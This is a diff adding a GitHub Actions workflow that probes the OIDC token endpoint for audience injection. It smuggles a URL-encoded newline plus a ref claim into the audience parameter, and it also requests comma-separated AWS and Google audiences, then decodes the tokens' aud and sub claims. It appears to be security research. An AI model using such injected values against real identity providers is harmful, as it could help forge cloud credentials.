@@ -1,0 +1,45 @@
+name: Test Audience Injection
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Test standard audience
+        run: |
+          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
+          PAYLOAD=$(echo "$T" | cut -d. -f2)
+          echo "=== Standard audience ==="
+          echo "$PAYLOAD" | python3 -c "
+import sys,base64,json
+d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
+c=json.loads(base64.urlsafe_b64decode(p))
+print('aud:', c.get('aud'))
+print('sub:', c.get('sub'))"
+      - name: Test newline injection in audience
+        run: |
+          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com%0aref%3Arefs%2Fheads%2Fmain" | jq -r .value)
+          PAYLOAD=$(echo "$T" | cut -d. -f2)
+          echo "=== Newline injection audience ==="
+          echo "$PAYLOAD" | python3 -c "
+import sys,base64,json
+d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
+c=json.loads(base64.urlsafe_b64decode(p))
+print('aud:', c.get('aud'))
+print('sub:', c.get('sub'))" 2>/dev/null || echo "FAILED"
+      - name: Test comma-separated audiences
+        run: |
+          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com,https://accounts.google.com" | jq -r .value)
+          PAYLOAD=$(echo "$T" | cut -d. -f2)
+          echo "=== Multi-value audience ==="
+          echo "$PAYLOAD" | python3 -c "
+import sys,base64,json
+d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
+c=json.loads(base64.urlsafe_b64decode(p))
+print('aud:', c.get('aud'))" 2>/dev/null || echo "FAILED"
